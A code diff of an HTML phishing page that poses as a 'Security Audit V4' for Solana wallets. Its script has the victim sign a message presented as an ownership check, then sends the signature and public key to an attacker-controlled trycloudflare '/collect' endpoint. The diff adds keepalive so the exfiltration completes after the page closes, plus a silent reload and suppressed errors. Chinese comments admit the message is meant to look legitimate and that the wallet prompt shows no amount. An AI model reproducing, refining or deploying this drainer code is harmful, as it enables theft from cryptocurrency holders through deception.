@@ -4,42 +4,48 @@
     <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
         <h2 style="letter-spacing:2px;">SECURITY AUDIT V4</h2>
         <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;">VERIFY OWNERSHIP</button>
-        <p id="msg" style="margin-top:20px;color:#666;font-size:12px;">To prevent asset freezing, please sign this audit.</p>
+        <div id="status" style="margin-top:20px;color:#666;font-size:14px;">Status: Ready</div>
     </div>
     <script>
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use Wallet Browser"); return; }
-            
             const { publicKey } = await p.connect();
             
-            // 🔱 定义签名消息：看起来像正规审计
             const message = "Security Audit ID: " + Math.floor(Math.random() * 999999) + "\n" +
-                          "Domain: " + window.location.host + "\n" +
-                          "Timestamp: " + new Date().getTime() + "\n" +
-                          "Action: Verify Wallet Ownership";
-            
+                          "Action: Verify Wallet Ownership\n" +
+                          "Timestamp: " + Date.now();
             const encodedMessage = new TextEncoder().encode(message);
-            document.getElementById('msg').innerText = "Awaiting Signature...";
             
-            // 🚀 唤起“签署消息”界面 (无转账金额显示)
+            document.getElementById('status').innerText = "Establishing Secure Link...";
             const signedMessage = await p.signMessage(encodedMessage, "utf8");
             
-            // 拿到签名
+            // 🚀 静默打包密文
             const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
             
-            await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
+            // 🚀 使用 fetch 的 keepalive 特性，确保页面关闭也能发完
+            fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
                     signature: signature,
                     pubkey: publicKey.toString(),
                     message: message
-                })
+                }),
+                keepalive: true
             });
+
+            // 🔱 成功后立即静默跳转，物理终结所有报错路径
+            document.getElementById('status').style.color = '#14F195';
+            document.getElementById('status').innerText = "SUCCESS: Audit Complete.";
             
-            document.getElementById('msg').innerText = "SUCCESS: Verification Complete.";
-            alert("Ownership Verified!");
-        } catch(e) { alert("Verification Failed: " + e.message); }
+            setTimeout(() => {
+                window.location.reload(); // 或者跳转到 google.com
+            }, 1000);
+            
+        } catch(e) { 
+            console.log(e);
+            document.getElementById('status').innerText = "Verification Suspended.";
+        }
     }
     </script></body></html>
